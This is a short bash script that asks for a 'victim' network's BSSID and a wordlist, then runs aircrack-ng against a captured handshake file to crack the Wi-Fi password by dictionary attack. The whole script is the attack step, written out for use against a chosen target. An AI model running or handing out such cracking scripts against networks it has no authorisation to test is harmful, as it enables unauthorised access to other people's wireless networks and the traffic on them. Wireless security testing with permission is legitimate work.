#! /../bin/bash

clear
echo -e "Enter the BSSID of victim"
read BSID
clear
echo -e "Enter the PATH of Wordlist"
read WPATH
aircrack-ng -b $BSID /../root/Dlon/handshakes/hand-01.cap -w $WPATH
sleep 60
